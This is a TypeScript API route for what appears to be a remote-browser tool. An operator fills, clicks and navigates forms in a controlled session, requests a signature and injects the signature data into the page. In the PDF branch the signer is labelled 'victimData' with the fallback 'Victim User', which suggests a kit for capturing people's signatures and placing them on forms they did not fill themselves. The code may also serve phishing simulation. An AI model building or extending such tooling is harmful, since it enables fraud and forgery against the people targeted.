import type { APIRoute } from 'astro';
import { getBrowserService } from '../../lib/services/remote-browser';
import { updateSession, getSession } from '../../lib/stores/signing-session';
import { createSubmission } from '../../lib/services/docuseal';

export const POST: APIRoute = async ({ request }) => {
  try {
    const { sessionId, action, data } = await request.json();
    
    if (!sessionId || !action) {
      return new Response(JSON.stringify({
        error: 'Session ID and action are required'
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    const browserService = getBrowserService();
    let result;
    
    switch (action) {
      case 'fill':
        if (!data?.selector || data?.value === undefined) {
          throw new Error('Selector and value are required for fill action');
        }
        result = await browserService.fillField(sessionId, data.selector, data.value);
        break;
        
      case 'click':
        if (!data?.selector) {
          throw new Error('Selector is required for click action');
        }
        result = await browserService.click(sessionId, data.selector);
        break;
        
      case 'select':
        if (!data?.selector || !data?.value) {
          throw new Error('Selector and value are required for select action');
        }
        result = await browserService.selectOption(sessionId, data.selector, data.value);
        break;
        
      case 'navigate':
        if (!data?.url) {
          throw new Error('URL is required for navigate action');
        }
        result = await browserService.navigateToForm(sessionId, data.url);
        break;
        
      case 'screenshot':
        result = await browserService.captureScreenshot(sessionId);
        break;
        
      case 'page-info':
        result = await browserService.getPageInfo(sessionId);
        break;
        
      case 'request-signature':
        // Handle signature request differently based on session type
        const session = getSession(sessionId);
        if (!session) {
          throw new Error('Session not found');
        }
        
        if (session.sessionType === 'pdf') {
          // For PDF sessions, delegate to our new PDF signature endpoint
          const url = new URL(request.url);
          const pdfResponse = await fetch(`${url.origin}/createapi/pdf-signature-request.json`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId,
              victimData: {
                email: session.customerData?.email || 'victim@example.com',
                name: session.customerData?.name || 'Victim User'
              }
            })
          });
          
          const pdfResult = await pdfResponse.json();
          if (!pdfResponse.ok) {
            throw new Error(`PDF signature request failed: ${pdfResult.error}`);
          }
          
          result = pdfResult;
        } else {
          // Original browser-based signature flow
          let signatureData;
          
          try {
            const docuSealResult = await createSubmission({
              templateId: 'signature_only',
              signerData: {
                email: session.formData?.email || 'customer@example.com',
                name: session.formData?.name || 'Customer',
                fields: {}
              },
              metadata: {
                sessionId,
                signatureField: 'auto-detected'
              }
            });
            
            signatureData = {
              signerSlug: docuSealResult.signerSlug,
              embedUrl: docuSealResult.embedUrl,
              mockMode: false
            };
          } catch (error) {
            console.warn('DocuSeal creation failed, using mock signature', error);
            signatureData = {
              signerSlug: 'mock_signer',
              embedUrl: null,
              mockMode: true
            };
          }
          
          // Update session to flag signature request for customer
          updateSession(sessionId, {
            signatureRequested: true,
            signatureData: signatureData
          });
          
          result = {
            message: 'Signature request sent to customer',
            signatureData: signatureData
          };
        }
        break;
        
      case 'inject-signature':
        if (!data?.signatureData) {
          throw new Error('Signature data is required');
        }
        result = await browserService.injectSignature(sessionId, data.signatureData);
        break;
        
      case 'close':
        await browserService.closeSession(sessionId);
        result = { status: 'closed' };
        break;
        
      default:
        throw new Error(`Unknown action: ${action}`);
    }
    
    return new Response(JSON.stringify({
      success: true,
      action,
      result
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    console.error('Browser action error:', error);
    return new Response(JSON.stringify({
      error: 'Browser action failed',
      details: error.message
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
};